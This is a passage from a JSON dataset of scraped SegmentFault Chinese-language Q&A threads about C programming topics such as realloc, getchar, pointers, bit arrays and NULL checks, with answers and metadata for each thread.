      "dsc": "<div class=\"question fmt\" data-id=\"1010000001733007\">\n<pre><code>int * p1 = (int *)malloc(100 * sizeof(int));\nint * p2;\nfor(int i = 0;i &lt; 100;i++)\n    p1[i] = i;\np2 = (int *)realloc(p1,200 * sizeof(int));\n</code></pre>\n<blockquote>\n<p>打个不恰当的比方：假设内从严重不足，p1所在的原来的内存块不能足够容纳200个连续的空闲单元，那么系统就会重新申请一个足够200个单元的连续空间，并把之前100个值复制到新空间的地方，然后返回新空间的地址。</p>\n</blockquote>\n<blockquote>\n<p>那么问题来了，我们传的是p1指针，指针是不带‘100’这个信息的，如何实现复制不多不少100个值呢？求解，谢谢！</p>\n</blockquote>\n</div>",
      "favourite": "0",
      "glance": "927",
      "tags": [
        "c"
      ],
      "time": "2014-11-17",
      "title": "对realloc函数实现的疑问",
      "url": "https://segmentfault.com/q/1010000001733007"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002420186\">\n<p>你的输入可以理解为：<code>c\\na\\n1\\nc\\nEOF</code>，其中<code>\\n</code>代表换行符，<code>EOF</code>代表文件结尾符（值一般为<code>-1</code>）。你可以数一数，<code>EOF</code>之前是不是8个字符呢？</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002420128\">\n<p>换行符也是一个字符啊<br>\n\\n != EOF</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002424878\">\n<p>大家的答案都是没有问题的。答主，其实你应该仔细观察一下你使用<code>getchar()</code>函数接收的具体的内容。<br>\n程序可以修改如下：</br></p>\n<pre><code>c</code><code>  1 #include&lt;stdio.h&gt;\n  2 \n  3 int main(){\n  4         long nc;\n  5         int displayContent = 0;\n  6         nc = 0;\n  7 \n  8         while ((displayContent = getchar()) != EOF) {\n  9                 printf(\"%d\\n\", displayContent);\n 10                 ++nc;\n 11         }\n 12 \n 13         printf(\"%ld\\n\", nc);\n 14 \n 15         return 0;\n 16 }\n\n</code></pre>\n<p>你能更加直观看到结果。</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002419445\">\n<html><body>\n<p><img data-src=\"/img/bVkjzm\"/></p>\n<p><img data-src=\"/img/bVkjzn\"/></p>\n<p>不明白为什么输出结果是8，而不是4</p>\n<p>代码来自《the c programming language》</p>\n</body></html>\n</div>",
      "favourite": "2",
      "glance": "1.3k",
      "tags": [
        "c"
      ],
      "time": "2014-12-11",
      "title": "关于C语言中的getchar函数",
      "url": "https://segmentfault.com/q/1010000002419445"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002477727\">\n<pre><code>while(\"\\0\")\n</code></pre>\n<p>这条语句判断的是\"\\0\"的值，在C里面也就是\"\\0\"的地址，这个条件会造成死循环，除非\"\\0\"的地址为0，在MINGW32环境下测试如此</p>\n<pre><code>while (*s++ = *t++);\n</code></pre>\n<p>这条语句判断的是赋值表达式的返回值，C里面赋值表达式返回的是左操作数的值，t和s是正确的字符串的情况下，最后一步会有 *s = '\\0';发生，这时候ASCII '\\0' 的值为0，循环退出</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002478088\">\n<p><code>'\\0'</code> 是 char<br><code>0</code> 是 int</br></p>\n<p>char 和 int 的差異只是對你而言，在內存當中都是 int。</p>\n<p>在內存當中，<code>'\\0'</code> 就是 <code>0</code>。</p>\n<p><code>0</code> 就是布爾邏輯中的 <code>FALSE</code>。</p>\n<p>所以 <code>while ('\\0')</code> 相當於 <code>while (false)</code></p>\n<p>另外，別忘了 PHP 中的賦值是左結合，居然是左結合，<code>a = b = c</code> 居然相當於 <code>(a = b) = c</code> 。。。</p>\n<p>還有誰告訴你賦值一定爲真。。。</p>\n<p>就連 PHP 都是可以 <code>if (a = (b = (c = 0))) return; // never execute</code></p>\n<p>賦值表達式的結果，取決於 right-hand side expression 的結果。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002477578\">\n<p>这个while判断的是<code>*s++ = *t++</code>表达式的值<br>\n对，没错，C语言里的表达式也是有值的，比如逗号表达式的值<code>1, 2, 3</code>的值等于最右边数的值即3<br>\n这个赋值表达式的值也是等于赋值完后的左值即<code>*s++</code>，也即当前<code>*s</code>的值<br>\n所以当t到达末尾的时候会读到字符串结尾的0，即<code>*t</code>为0，被赋值的<code>*s</code>也是0，while里面是个0自然会跳出循环<br>\n另外<code>'\\0'</code>的值为0，所以<code>while('\\0')</code>会跳出循环<br>\n另外<code>while(\"\\0\")</code>不会跳出循环，因为字符串常量的值实际山是它的地址，字符串常量的地址都不会是0</br></br></br></br></br></p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002477483\">\n<p>while(\"\\0\")为什么会跳出<br>\n以下的while为什么又会跳出呢，因为以前是写PHP的不太理解，赋值不是一直会为真的吗？</br></p>\n<pre><code>请输入代码/* strcpy: 将 t 复制到s;指针版 3 */\n void strcpy(char *s, char *t)\n  {     \n      while (*s++ = *t++)         ; \n  } \n</code></pre>\n</div>",
      "favourite": "1",
      "glance": "2.2k",
      "tags": [
        "c"
      ],
      "time": "2015-01-10",
      "title": "C语言\\0与0的区别 以及while的判断",
      "url": "https://segmentfault.com/q/1010000002477483"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002513889\">\n<p>加前缀吧 把不需要暴露的函数尽量以static声明</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002512728\">\n<p>按惯例是要加前缀的，比如OpenGL就有前缀gl。也可以考虑用C++，C++有命名空间。或者你可以在C里面模拟C++的命名空间，比如用一个struct把函数封装起来。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002512655\">\n<p>建议加个前缀，而且只暴露必须的函数</p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002512553\">\n<p>C语言一个模块以库形式提供出去, 要不要把所有函数都加上一个统一前缀, 防止命名冲突? 或者有没有更好方法?</p>\n</div>",
      "favourite": "0",
      "glance": "1.6k",
      "tags": [
        "c"
      ],
      "time": "2015-01-26",
      "title": "C语言一个模块以库形式提供出去, 要不要把所有函数都加上一个统一前缀, 防止命名冲突? 或者有没有更好方法?",
      "url": "https://segmentfault.com/q/1010000002512553"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002534752\">\n<html><body>\n<p>源代码很简单，就是定义一个float变量a=2.5，int变量b=2</p>\n<p>然后将a,b分别按%d %f型输出。<br>\n当然没有按正确类型格式化输出肯定是有问题的。<br>\n但是按正确类型格式化输出也发生了很奇怪的问题。<br>\n源代码如下，VS2013下编译通过0 errors, 0 warnings。</br></br></br></p>\n<pre><code>#include &lt;stdio.h&gt;\nint main(void)\n{\n\nfloat a = 2.5;\nint b = 2;\n\n\nprintf(\"%d\\n%f\\n%d\\n%f\\n\", a, a, b, b);    /*这条语句的输出全是错的*/\nputchar('\\n');\n\nprintf(\"%f\\n%d\\n%f\\n%d\\n\", a, a, b, b);    /*这条语句的输出有两个对的两个错的，符合我的预期*/\n\nreturn(0);}\n</code></pre>\n<p>输出结果如下图<br><img data-src=\"/img/bVkNyZ\"/></br></p>\n<p>我的主要问题是，为什么第一个printf的输出没有一个是对的？<br>\n本人是小白，希望能有大神帮忙解答，多谢！</br></p>\n</body></html>\n</div>",
      "favourite": "1",
      "glance": "3.2k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2015-02-04",
      "title": "C语言中printf输出的奇怪错误",
      "url": "https://segmentfault.com/q/1010000002534752"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002606594\">\n<p>类似的问题<a href=\"http://segmentfault.com/q/1010000002592221?_ea=149727\" rel=\"nofollow\">http://segmentfault.com/q/1010000002592221?_ea=149727</a><br>\n解惑的文章 <a href=\"http://www.dlifep.com/?p=348\" rel=\"nofollow\">http://www.dlifep.com/?p=348</a></br></p>\n<p>如果不看文章，那么简单的说，就是a是个变量名，指示了数组，所以sizeof(a)才得到正确的值<br>\nsizeof(&amp;a)自然是对首地址做运算了</br></p>\n<p>请问sizeof是一个操作符还是一个函数？</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002607024\">\n<p>a本身是一个引用变量，C是会给a本身分配一个内存地址，&amp;a就是获取这个地址的引用。数组的内容是存放在堆中，其引用放在栈中，这样读取速度才比较快。a的值就是数组的首地址的引用。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002606678\">\n<p>a和&amp;a的值是相同的，都等于<code>a[0]</code>的地址，区别是两者类型不同。</p>\n<p>用下面的代码打印一下就知道值是一模一样的了：</p>\n<pre><code>    printf(\"a = %p\\n\", a);\n    printf(\"&amp;a = %p\\n\", &amp;a);\n    printf(\"&amp;a[0] = %p\\n\", &amp;a[0]);\n</code></pre>\n<p><code>a</code>的类型是<code>int [5]</code>，<code>&amp;a</code>的类型是<code>int (*)[5]</code>。所以，<code>sizeof(a)</code>求的是整个数组的字节数（一般的机子都是20），而<code>sizeof(&amp;a)</code>求的是一个指针的字节数，等于<code>sizeof(unsigned long)</code>（32位的机子是4, 64位的机子是8）。</p>\n<p>另外，类型的不同在函数调用传参的时候也会造成区别。假设有如下三个函数：</p>\n<pre><code>    void fun1(int a[]) {}\n    void fun2(int *a) {}\n    void fun3(int (*a)[5]) {}\n</code></pre>\n<p><code>fun1</code>和<code>fun2</code>等价（数组退化为指针），可以接受<code>a</code>，传<code>&amp;a</code>就编译不过了。相反，<code>fun3</code>可以接受<code>&amp;a</code>，但是传<code>a</code>就要报错了。</p>\n</div>",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002606503\">\n<pre><code>c</code><code>    int a[5];\n    sizeof(a);\n    sizeof(&amp;a); \n</code></pre>\n<p>如上，a是数组名，那么a对C来说不就是数组a的首地址吗，那么&amp;a又是什么意思？&amp;a的内容是什么？</p>\n</div>",
      "favourite": "2",
      "glance": "1.7k",
      "tags": [
        "c",
        "c和指针"
      ],
      "time": "2015-03-18",
      "title": "C语言中对数组a再取址是什么",
      "url": "https://segmentfault.com/q/1010000002606503"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002639256\">\n<p>It is quite similar to my Facebook interview question:  a game has 3 levels of scores: 1 point, 2 points, 5 points. please print all the ways you can get 10 points.</p>\n<p><img data-src=\"/img/bVlgtG\"/></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002628499\">\n<p>简单想了一下，这道题目优化思路和斐波那契数列的优化思路相同:记录f(n)。</p>\n<p>根据题目可知f(n)=f(n-1)+f(1)=f(n-2)+f(2)=f(n-3)+f(3)=f(1)+f(n-1)=..<br>\n手机码字后面两个等式就不写了。<br>\nf(n)的可能也就这6种(当然肯定包含重复)</br></br></p>\n<p>那么一点点推导f(4)因为f123已知，f4可以在O(1)内得到，记录。<br>\nf5，此时f1234已知，f5也能在O(1)得到，记录。<br>\n那么f(n)，根据上述的公式，可以在O(n)内得到。</br></br></p>\n<p>这是大致思路，接下来解决重复问题就行了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002629181\">\n<p>谢谢邀请。</p>\n<p>出这道题，明显是为了考察你 DP。我也不多说，直接放码过来了：</p>\n<pre><code>cpp</code><code>void step(int n, std::string str) {\n    if (n == 0) { std::cout &lt;&lt; str &lt;&lt; \"\\b \" &lt;&lt; std::endl; }\n    if (n &gt;= 1) step(n-1, str+\"1m,\");\n    if (n &gt;= 2) step(n-2, str+\"2m,\");\n    if (n &gt;= 3) step(n-3, str+\"3m,\");\n}\n</code></pre>\n<p>当 <code>n == 4</code> 的时候，调用：<code>step(4, \"\");</code> 原样输出你想要的。</p>\n<hr>\n<p>这里只是用最短的代码表述我的思路，怕爆栈的，自行修改。</p>\n</hr></div>",
      "attention": "31",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002627415\">\n<p>一救援机器人有三种跳跃模式，可分别跳跃1m，2m，3m的距离，请用程序实现该机器人行进n米路程时可用的跳跃方式。<br>\n程序语言不限，当距离n值足够大时，程序执行时间尽量小。</br></p>\n<p>例：当距离为4米时，输出结果有7种：</p>\n<pre><code>1m,1m,1m,1m\n1m,1m,2m\n1m,2m,1m\n1m,3m\n2m,1m,1m\n2m,2m\n3m,1m\n</code></pre>\n</div>",
      "favourite": "16",
      "glance": "4.1k",
      "tags": [
        "程序员",
        "c",
        "php",
        "ruby",
        "java"
      ],
      "time": "2015-03-27",
      "title": "日本雅虎程序员跳槽程序测试问题",
      "url": "https://segmentfault.com/q/1010000002627415"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002629372\">\n<p>要节省空间的话可以使用位操作来完成，位操作的效率其实挺高的，并没有你想象的那么低，像楼上的把位操作定义成宏直接用也会被做成函数效率高。</p>\n<p>下面是使用位操作实现的一个数组和测试，可以改造成一个队列：</p>\n<pre><code>C</code><code><br>#include &lt;stdio.h&gt;\n\n\n// 机器字长，一般C/C++规定int类型为机器字长\n// 选择和机器字长一致的变量可以加快访问运算速度\n#define CPU_SIZE    sizeof(unsigned int)\n\n// 一机器字长能够保存的比特数\n#define CPU_SIZE_BIT    (CPU_SIZE*8)\n\n// 计算_bitlen需要都少个机器字长\n#define LEN_OF_BITS(_bitlen)    ((_bitlen+CPU_SIZE_BIT-1)/CPU_SIZE_BIT)\n\n// 定义_var为_bitlen比特变量\n// 在C89上，定义需要放在函数开始位置\n#define DEFINE_BITS(_var, _bitlen)  unsigned int _var[LEN_OF_BITS(_bitlen)]\n\n// 将_var的第_ix置1\n#define BIT_SET(_var, _ix) (_var)[(_ix)/CPU_SIZE_BIT] |= (1&lt;&lt;((_ix)%CPU_SIZE_BIT))\n\n// 将_var的第_ix置0\n#define BIT_RESET(_var, _ix) (_var)[(_ix)/CPU_SIZE_BIT] &amp;= ~(1&lt;&lt;((_ix)%CPU_SIZE_BIT))\n\n// 获取_var的第_ix位\n#define BIT_GET(_var, _ix)  (((_var)[(_ix)/CPU_SIZE_BIT]&gt;&gt;((_ix)%CPU_SIZE_BIT))&amp;0x01)\n\n\n// 测试用的比特数目\n#define BITLEN  100\n\nint main()\n{\n    DEFINE_BITS(bits, BITLEN);  // 定义bits为BITLEN个位的变量\n    int i;\n\n    // 输出一下这些bits到底占多少字节\n    printf(\"sizeof(bits)=%d\\n\", sizeof(bits));\n\n    // 设置\n    for(i=0; i&lt;BITLEN; ++i){\n        // 只是做个简单的测试：将3和5倍数位置上的位置位1\n        // 其他置0\n        if(i%3==0 || i%5==0){\n            // 第i个置为1\n            BIT_SET(bits, i);\n        }\n        else{\n            // 第i个置为0\n            BIT_RESET(bits, i);\n        }\n    }\n\n    // 输出\n    for(i=0; i&lt;BITLEN; ++i){\n        printf(\"%02d:%d \", i, BIT_GET(bits, i));\n        if(i%10==9){\n            printf(\"\\n\");\n        }\n    }\n    return 0;\n}\n\n\n</br></code></pre>\n<p>代码很多常量运算会在编译阶段自动优化，所以不必刻意担心。</p>\n<p>测试输出：</p>\n<pre><code>E:\\TEMP&gt;gcc t.c -o t.exe &amp;&amp; t.exe\nsizeof(bits)=16\n00:1 01:0 02:0 03:1 04:0 05:1 06:1 07:0 08:0 09:1\n10:1 11:0 12:1 13:0 14:0 15:1 16:0 17:0 18:1 19:0\n20:1 21:1 22:0 23:0 24:1 25:1 26:0 27:1 28:0 29:0\n30:1 31:0 32:0 33:1 34:0 35:1 36:1 37:0 38:0 39:1\n40:1 41:0 42:1 43:0 44:0 45:1 46:0 47:0 48:1 49:0\n50:1 51:1 52:0 53:0 54:1 55:1 56:0 57:1 58:0 59:0\n60:1 61:0 62:0 63:1 64:0 65:1 66:1 67:0 68:0 69:1\n70:1 71:0 72:1 73:0 74:0 75:1 76:0 77:0 78:1 79:0\n80:1 81:1 82:0 83:0 84:1 85:1 86:0 87:1 88:0 89:0\n90:1 91:0 92:0 93:1 94:0 95:1 96:1 97:0 98:0 99:1\n</code></pre>\n<p>可以看到100位数据的保存只用了16个字节。<br>\n如你所见，代码的可读性变差很多，有的时候需要考虑这种牺牲是否是值得的</br></p>\n<p>时间和空间两者之间本身就是矛盾的，只能根据具体的情况来进行二者之间的权衡。unsigned char的话空间的确不够么？位操作的话效率的确跟不上来了么？</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002628715\">\n<p>用bit来存， 一个Byte能存8个bit，而bit有只有0,1两种表示。判断是0还是1用位运算。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002628386\">\n<p>用与<code>&amp;</code>预算检测.</p>\n<pre><code>#include &lt;stdio.h&gt;\n\n// 检测定义成一个宏\n#define IS_SET(ch, idx) ((ch) &amp; (0x01&lt;&lt;(idx)))\n\nint main()\n{\n    unsigned char ch = 0x14; // 二进制 0001 0100;\n    // 从右往左, 第三位(下标从0开始, 所以程序里是2)是1吗?\n    if (IS_SET(ch, 2)) {\n        printf(\"YES\\n\");\n    } else {\n        printf(\"NO\\n\");\n    }\n\n    return 0;\n}\n</code></pre>\n</div>",
      "attention": "10",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002628327\">\n<p>现在暂时我用<code>unsigned char</code>类型来替代<code>bool</code>,因为C语言没有bool嘛。<br>\n如果只是保存的话可以每八位变成一个<code>char</code>去储存，但问题是我需要快速访问那些位是<code>0</code>还是<code>1</code></br></p>\n</div>",
      "favourite": "0",
      "glance": "1.4k",
      "tags": [
        "c"
      ],
      "time": "2015-03-28",
      "title": "C语言中如何最节省地保存0,1的一个长队列？",
      "url": "https://segmentfault.com/q/1010000002628327"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002659097\">\n<p>你不能“设置”<code>int</code>的字长，这玩意儿本来就不是能设置的东西。<br>\n但大多数C的实现里<code>long</code>的字长等于机器字长，前提是你生成的是“native binary”，比如在64位系统里生成64位的程序。<br>\n另外，pointer/<code>intptr_t</code>/<code>uintptr_t</code>的字长一般也等于机器字长。</br></br></p>\n<p>当然，在51之类的单片机上或者16位的古老系统里完全不是这么回事</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002675449\">\n<p>在不同平台(x86, x64等)和不同的编译器上使用的数据模型是不一样的, 具体可以参考:<br><a href=\"http://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models\" rel=\"nofollow\">http://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models</a></br></p>\n<p>另外想拿到和机器字长一样的数据结构的话, 可以用size_t</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002659076\">\n<p>在Linux上用GCC编译，32位机的long是4字节，64位机的long是8字节。</p>\n<p>在VS上搜索了一下宏<code>INT_MAX</code>的定义，貌似只有一处，是<code>2147483647</code>，所以应该没有办法设置了吧，只能自己定义一个类型了。</p>\n<p>而且我了解到通常一些项目都不会直接使用默认类型，而是重新定义一组类型来使用，比如我就可以这样定义一组类型：</p>\n<pre><code>#ifdef m32\ntypedef int SpacelanInt;\ntypedef float SpacelanFloat;\n#else\ntypedef long int SpacelanInt;\ntypedef double SpacelanFloat;\n#endif\n</code></pre>\n</div>",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002658694\">\n<p>比如在处理问题：“如何不使用sizeof()用C程序获得系统字长？”</p>\n<p>即便在64位机上，使用过的C编译器也会将int编译为32位。那么如何在C中设置，使得int编译字长和系统字长相同呢？</p>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "c",
        "c++",
        "程序员",
        "操作系统",
        "windows"
      ],
      "time": "2015-04-08",
      "title": "使用C编译器，如何设置使得int字长与系统字长相同",
      "url": "https://segmentfault.com/q/1010000002658694"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002660105\">\n<p>完全一样,看个人习惯.从可读性来说,推荐后者</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002660135\">\n<p>webkit coding style要求用前者。。。</p>\n<p><a href=\"http://www.webkit.org/coding/coding-style.html#zero-comparison\" rel=\"nofollow\">http://www.webkit.org/coding/coding-style.html#zero-comparison</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002660171\">\n<p>在 C 语言里并无不同，但推荐使用前者。</p>\n<ol>\n<li>\"NULL\" 的本质是个宏，并非是 build-in 常量，C99 中甚至可以自行定义，<strong>故尽量避免使用它去判断</strong>。[1]</li>\n<li>当 <code>!s</code> 与 <code>s == NULL</code> 表示同一含义的时候，使用前者。(程序员的原则：<strong>Brevity Can Be a Virtue</strong>)</li>\n<li>前者更为业界所认可，<strong>用来判断有保障</strong>。[2]</li>\n</ol>\n<hr>\n<ul>\n<li>[1] NULL 宏定义在<a href=\"http://www.cplusplus.com/reference/cstddef/NULL/\" rel=\"nofollow\"><code>&lt;stddef.h&gt;</code></a>中，通常有两种定义方式：</li>\n</ul>\n<pre><code>c</code><code>#define NULL ( (void *) 0)\n</code></pre>\n<p>或</p>\n<pre><code>c</code><code>#define NULL 0\n</code></pre>\n<blockquote>\n<p>C11(ISO/IEC 9899:201x) §6.3.2.3 Pointers Section 3</p>\n</blockquote>\n<blockquote>\n<p>An integer constant expression with the value 0, or such an expression cast to type  void *, is called a null pointer constant</p>\n</blockquote>\n<p>另见: <a href=\"http://port70.net/~nsz/c/c99/n1256.html#7.17\" rel=\"nofollow\">7.17 Common definitions &lt;stddef.h&gt;</a><br>\n以及 <a href=\"http://c-faq.com/null/machnon0.html\" rel=\"nofollow\">Question 5.5</a></br></p>\n<ul>\n<li>[2] 见 <a href=\"http://c-faq.com/null/ptrtest.html\" rel=\"nofollow\">Question 5.3</a>\n</li>\n</ul>\n<hr>\n<p>多一嘴，在 C++ 里，<code>NULL</code> 仅存在于 C++0x 标准中，在 C++11 中，要求使用 <code>nullptr</code> 来表示。</p>\n</hr></hr></div>",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002660039\">\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(int argc, char const *argv[]) {\n\n  char *s = \"hello\";\n\n  if (!s) {\n    fprintf(stderr, \"s is null\\n\");\n  } else {\n    fprintf(stderr, \"%s\\n\", s);\n  }\n\n  if (s == NULL) {\n    fprintf(stderr, \"s is null\\n\");\n  } else {\n    fprintf(stderr, \"%s\\n\", s);\n  }\n\n\n  return 0;\n}\n</code></pre>\n<p>这两种方法貌似都能判断字符指针是否为空，有什么不一样的吗?用哪种比较好?</p>\n</div>",
      "favourite": "2",
      "glance": "1.2k",
      "tags": [
        "指针",
        "c"
      ],
      "time": "2015-04-09",
      "title": "用 NULL 或者符号 ! 判断 C 语言字符指针有什么区别？",
      "url": "https://segmentfault.com/q/1010000002660039"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002673333\">\n<html><body><p><strong>实验五<br>\n 一、实验名称：采用共享内存的进程间通信<br>\n 二、实验目的与要求 建立一个利用共享内存机制的，以实现经典同步问题readers/writers 的解决方案；完成学习例题的实验程序的编辑、编译、运行操作；分析、学习实验程序的工作过程和原理。<br>\n 三、实验内容 在固定分区管理方式下实现主存分配和回收。<br><img data-src=\"/img/bVlnB7\"/></br></br></br></br></strong></p></body></html>\n</div>",
      "favourite": "0",
      "glance": "804",
      "tags": [
        "c"
      ],
      "time": "2015-04-14",
      "title": "如何用C语言实现采用共享内存的进程间通信？",
      "url": "https://segmentfault.com/q/1010000002673333"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002704625\">\n<pre><code>enum eTaskType{\nTYPE_UNKOWN,\nTYPE_ADD,\n};\n</code></pre>\n<p>or</p>\n<pre><code>typedef enum eTaskType{\nTYPE_UNKOWN,\nTYPE_ADD,\n}TaskType;\n</code></pre>\n<p>假如有上述枚举,或者其他定义方法，如何才能通过枚举变量或枚举类型访问成员(通过. -&gt; ::等方式)，比如：<br>\nTaskType.TYPE_ADD</br></p>\n</div>",
      "favourite": "0",
      "glance": "606",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2015-04-24",
      "title": "C/C++中枚举值的访问方法",
      "url": "https://segmentfault.com/q/1010000002704625"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002757546\">\n<p><code>setjmp</code> 和 <code>longjmp</code> 这两个函数可以实现类似的功能，好像是标准库里的函数<br>\n参见<br><code>http://blog.csdn.net/bigloomy/article/details/6659146</code></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002757886\">\n<p>啥叫C进程？你的进程可以自己打log嘛～等着C实现try catch，你有得等了～</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002765724\">\n<p>用断言<br>\n#define assert_param(expr) ((expr) ? (void)0 : assert_failed((uint8_t *)__FILE__, __LINE__))</br></p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002757531\">\n<p>目前遇到这样的问题，大概在2000多台服务器里面有100多多台一个c进程挂掉了，由于公司各种的流程调试起来非常困难。</p>\n<p>这几天google了下找到了一些资料，捕获异常堆栈的，如<a href=\"http://spin.atomicobject.com/2013/01/13/exceptions-stack-traces-c/\" rel=\"nofollow\">http://spin.atomicobject.com/2013/01/13/exceptions-stack-traces-c/</a></p>\n<blockquote>\n<p>我有两个疑虑：<br>\n  这篇文章里面用的不知道linux各个版本内核是否是标准支持吗？<br>\n  里面还用到一个命令<code>addr2line</code>，是否标准支持。</br></br></p>\n</blockquote>\n<p>目前我想问问，有没有<code>linux c</code>已经实现好了的<code>try catch</code>框架,能打印异常堆栈，最好能定位到行。</p>\n</div>",
      "favourite": "0",
      "glance": "1.5k",
      "tags": [
        "c"
      ],
      "time": "2015-05-11",
      "title": "linux c异常处理",
      "url": "https://segmentfault.com/q/1010000002757531"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002766367\">\n<p>可以往前端方向考虑一下~</p>\n<p>html和css入门也不复杂，js吃透比较重要，抽空看看jquery。</p>\n<p>或者往美工方向发展。</p>\n<p>或者直接就学安卓或者ios。</p>\n<p>最后一句话：现在真正意识到要搞什么，一切都不晚~</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002766422\">\n<p>互联网行业并不是只有做网站，做 App 的。<br>\n题主既然已经有了电子工程行业的经验和编程基础，建议考虑下消费电子，智能硬件相关的公司和职位。</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002766336\">\n<p>这个要看自己的未来发展和兴趣爱好。其实it、互联网这个范围太广了，包括的岗位也各种各样的。有编程基础的话可能从测试入门比较容易，做测试的女生比较多。<br>\n就像你说的先入行然后接触之后发现其他兴趣，或者想朝其他方面发展的话到时可以再侧重点的学习和积累然后完成转岗等，可能相对更加容易点。<br>\n其实个人觉得交互设计和运营等都跟个人的特质有关系的，不是所有的人都适合的。<br>\n软件开发确实比较辛苦，如果你觉得自己可以的话也可以尝试。</br></br></br></p>\n</div>",
      "attention": "14",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002765641\">\n<p>毕业两年了，本科学电子工程，其实中学时候就对IT,互联网比较感兴趣，也想过将来做这行，可大学时候脑子被驴踢了，居然去学什么电子。想着干一行爱一行，可入行快两年，不仅没爱上，反而越干越抑郁，上班比上坟心情还沉重，受够了每天跟“破铜烂铁”打交道...<br>\n已经下决心进入互联网行业，可自己什么知识储备都没有，唯一能搭上边的就是C语言，linux系统也会，其他一些编程语言也会，但都是嵌入式方面的，自觉帮助不大</br></p>\n<p>之前问过别人，有人建议我从软件测试做起，说是没什么歧视，做的女生还是挺多的，也有提议从交互设计入手的，还有叫我去做网站运营的，其实我也考虑过软件开发，有业内人士说这都是男人的天下，没单位会要你的.....<br>\n我不是在纠结性别这种问题，只是社会现状是这样，公司招人总在意性别</br></p>\n<p>至于定位问题，我想还是先入行吧，等跨进去了再考虑，进不了行想再多也没什么用，不知道各位大哥大姐有什么建议！跪求 (/≥▽≤/)</p>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "c",
        "linux",
        "软件测试",
        "ui",
        "转行"
      ],
      "time": "2015-05-14",
      "title": "电子行业女生转做互联网从哪个方向切入比较好入行？",
      "url": "https://segmentfault.com/q/1010000002765641"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002781451\">\n<p>str是代表数组的首地址。<br>\n&amp;str是行指针，此时的类型发生了变化，即 char (*str)[]</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002778616\">\n<p>这是指针的一个特殊情况:</p>\n<blockquote>\n<p>编译器会将数组名当作数组首元素的地址</p>\n</blockquote>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002783720\">\n<p>两个指针代表的含义不一样,可以通过sizeof(XX)来判断指针代表的意义</p>\n</div>",
      "attention": "7",
